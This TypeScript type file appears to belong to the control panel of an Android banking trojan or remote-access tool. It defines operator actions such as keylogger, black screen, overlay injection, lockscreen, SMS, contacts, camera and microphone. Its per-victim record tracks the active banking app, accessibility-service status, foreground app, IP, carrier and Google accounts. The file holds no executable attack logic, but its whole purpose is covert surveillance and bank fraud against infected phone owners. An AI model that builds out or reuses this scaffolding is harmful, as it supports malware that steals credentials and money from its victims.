export type DevicePanelAction =
  | 'screen'
  | 'silent'
  | 'touchVisualizer'
  | 'blackScreen'
  | 'screenReader'
  | 'camera'
  | 'mic'
  | 'apps'
  | 'keylogger'
  | 'lockscreen'
  | 'floating'
  | 'injection'
  | 'sms'
  | 'contacts';

export interface Cliente {
  id: string;
  deviceId: string;
  status: 'online' | 'offline';
  tag: string;
  country: string;
  carrier: string;
  ip: string;
  android: string;
  badges: string[];
  model: string;
  manufacturer: string;
  lastSeen?: string;
  latencyMs: number;
  lastActivityAt?: string;
  modelName: string;
  androidVersion: string;
  activeBank?: { package: string; appName: string; icon?: string; timestamp?: string } | null;
  foregroundPackage?: string | null;
  foregroundApp?: string | null;
  isLocked?: boolean | null;
  isScreenOn?: boolean | null;
  batteryLevel?: number | null;
  isCharging?: boolean | null;
  accessibilityActive?: boolean | null;
  customName?: string | null;
  networkType?: string | null;
  accounts?: string[] | null;
  googleAccounts?: string[] | null;
}

export interface ContextMenuSection {
  title?: string;
  items: ContextMenuItem[];
}

export interface ContextMenuItem {
  id: string;
  label: string;
  icon?: string;
  panel?: DevicePanelAction;
  disabled?: boolean;
  hint?: string;
}
